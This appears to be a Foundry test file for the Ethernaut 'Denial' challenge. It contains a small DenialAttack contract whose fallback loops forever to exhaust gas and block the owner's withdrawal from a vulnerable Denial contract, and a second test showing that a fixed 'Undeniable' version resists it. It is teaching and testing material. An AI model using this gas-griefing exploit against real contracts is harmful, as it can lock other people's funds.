// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test } from "forge-std/Test.sol";

import { Denial, Undeniable } from "../../contracts/vulnerable/DenialOfService.sol";

/**
 * From Ethernaut: https://docs.eridian.xyz/ethereum-dev/defi-challenges/ethernaut
 * Source: https://github.com/OpenZeppelin/ethernaut/blob/d05643a4/contracts/src/attacks/DenialAttack.sol
 */
contract DenialAttack {
    fallback() external payable {
        // consume all the gas
        while (true) { }
    }
}

contract DenialOfService is Test {
    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");

    uint256 constant ETHER_IN_STORE = 1000 ether;

    Denial store = new Denial();

    modifier checkSolvedByPlayer() {
        vm.startPrank(attacker, attacker);
        _;
        vm.stopPrank();
        _isSolved();
    }

    function setUp() external {
        startHoax(deployer);
        payable(store).transfer(ETHER_IN_STORE);
        vm.stopPrank();
    }

    function test_assertInitialState() external view {
        assertEq(address(store).balance, ETHER_IN_STORE);
        assertEq(store.owner().balance, 0);
    }

    function test_denialOfService() external checkSolvedByPlayer {
        DenialAttack attack = new DenialAttack();
        store.setWithdrawPartner(address(attack));
        try store.withdraw{ gas: 100_000 }() { } catch { }
    }

    function _isSolved() internal view virtual {
        assertEq(address(store).balance, ETHER_IN_STORE, "Not enough ETH in pool account");
        assertEq(store.owner().balance, 0, "Owner withdrawn ETH");
    }
}

contract DenialOfServiceResistent is DenialOfService {
    uint256 constant WITHDRAWN_AMOUNT = 10 ether;

    constructor() {
        store = new Undeniable();
    }

    function _isSolved() internal view override {
        assertEq(address(store).balance, ETHER_IN_STORE - WITHDRAWN_AMOUNT, "Not enough ETH in pool account");
        assertEq(store.owner().balance, WITHDRAWN_AMOUNT, "Owner didn't withdraw ETH");
    }
}
